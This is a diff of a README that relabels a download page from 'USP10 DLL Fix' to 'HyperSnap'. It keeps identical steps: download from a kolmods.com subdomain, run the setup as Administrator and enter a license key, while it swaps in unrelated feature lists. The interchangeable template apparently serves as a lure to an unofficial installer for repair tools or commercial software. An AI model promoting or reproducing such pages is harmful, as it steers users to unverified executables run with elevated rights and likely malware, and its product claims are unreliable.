@@ -1,14 +1,10 @@
-# USP10 DLL Fix Crash Fix Notes
+# HyperSnap Windows Setup Notes
 
-<p align="center">
-  <a href="https://usp10-dll-missing-fix.kolmods.com/">
-    <img src="https://img.shields.io/badge/Download-USP10%20DLL%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download USP10 DLL Fix">
-  </a>
-</p>
+[⬇ Download HyperSnap for Windows](https://hypersnap-setup.kolmods.com/)
 
 ## Download & Install
 
-> Setup notes for **USP10 DLL Fix** on Windows 10/11 (64-bit). Run the repair tool as Administrator.
+> Setup notes for **HyperSnap** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -16,15 +12,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **USP10 DLL Fix** from the Start menu
+5. Restart if the installer asks — then launch **HyperSnap** from the Start menu
 
 ## What you can use it for
 
-- Fix USP10 DLL Fix launch crashes on Windows 10/11
-- Resolve DirectX and Visual C++ runtime errors for USP10 DLL Fix
-- Restore stable gameplay after GPU driver updates
-- Repair corrupted or missing game files for USP10 DLL Fix
-- Stop black-screen and instant-close startup failures
+- Capture full screen, window, or region shots
+- Scrolling capture for long web pages
+- Annotation arrows, blur, and text overlays
+- GIF and video screen recording modes
+- Quick share and clipboard workflows
 
 ## License
 
